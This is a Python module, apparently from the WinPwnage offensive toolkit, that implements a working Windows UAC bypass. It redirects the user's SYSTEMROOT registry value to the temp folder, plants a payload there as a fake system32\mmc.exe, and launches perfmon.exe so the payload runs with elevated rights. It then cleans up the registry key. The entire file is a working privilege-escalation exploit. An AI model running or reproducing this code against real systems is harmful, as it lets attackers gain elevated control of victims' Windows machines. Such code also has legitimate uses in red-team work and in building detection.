import os
import time
import shutil
import tempfile
from winpwnage.core.prints import *
from winpwnage.core.utils import *

perfmon_info = {
	"Description": "Bypass UAC using perfmon and registry key manipulation",
	"Id": "7",
	"Type": "UAC bypass",
	"Fixed In": "16299" if not information().uac_level() == 4 else "0",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "perfmon",
	"Function Payload": True,
}


def perfmon_cleanup(path):
	# Also add removal of directory and binary, if fail put
	# only warning as indication
	print_info("Performing cleaning")
	if registry().remove_key(hkey="hkcu", path=path, name="SYSTEMROOT", delete_key=False):
		print_success("Successfully cleaned up")
		print_success("All done!")
	else:
		print_error("Unable to cleanup")
		return False

def perfmon(payload):
	if payloads().exe(payload):
		if not os.path.exists(payload):
			print_error("Args are not allowed with this technique")
			return False

		path = "Volatile Environment"

		if registry().modify_key(hkey="hkcu", path=path, name="SYSTEMROOT", value=tempfile.gettempdir(), create=True):
			print_success("Successfully created SYSTEMROOT key containing a new temp directory ({dir})".format(
							dir=os.path.join(tempfile.gettempdir())))
		else:
			print_error("Unable to create registry keys")
			return False

		if not os.path.exists(os.path.join(tempfile.gettempdir(), "system32")):
			try:
				os.makedirs(os.path.join(tempfile.gettempdir(), "system32"))
			except Exception as error:
				print_error("Unable to create directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
				for x in Constant.output:
					if "error" in x:
						perfmon_cleanup(path)
						return False
			else:
				print_success("Successfully created directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
		else:
			print_warning("Directory already exists ({tmp_path}) using existing one".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))

		time.sleep(5)

		try:
			os.remove(os.path.join(tempfile.gettempdir(), "system32\\mmc.exe"))
		except Exception as error:
			pass

		try:
			shutil.copy(payload, os.path.join(tempfile.gettempdir(), "system32\\mmc.exe"))
		except shutil.Error as error:
			print_error("Unable to copy payload to directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
			for x in Constant.output:
				if "error" in x:
					perfmon_cleanup(path)
					return False
		except IOError as error:
			print_error("Unable to copy payload to directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
			for x in Constant.output:
				if "error" in x:
					perfmon_cleanup(path)
					return False
		else:
			print_success("Successfully copied payload to directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("perfmon.exe"):
				print_success("Successfully spawned process ({})".format(payload))
				time.sleep(5)
				perfmon_cleanup(path)
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
				for x in Constant.output:
					if "error" in x:
						perfmon_cleanup(path)
						return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False